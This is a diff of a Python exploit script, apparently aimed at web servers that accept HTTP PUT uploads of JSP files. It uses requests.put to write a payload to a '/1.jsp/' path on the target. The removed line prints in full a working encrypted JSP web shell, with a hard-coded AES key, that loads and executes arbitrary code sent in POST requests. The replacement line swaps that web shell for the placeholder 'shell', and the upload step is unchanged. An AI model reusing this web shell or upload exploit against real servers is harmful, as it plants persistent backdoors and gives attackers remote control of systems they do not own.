@@ -17,7 +17,7 @@ def ccc(url):
 
 def aaa():
     url2=url+"/1.jsp/"
-    payload="<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="c822c1b63853ed27";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>"
+    payload="shell"
     html2 = requests.put(url2, data=payload,headers=headers)
     code=str(html2.status_code)
 
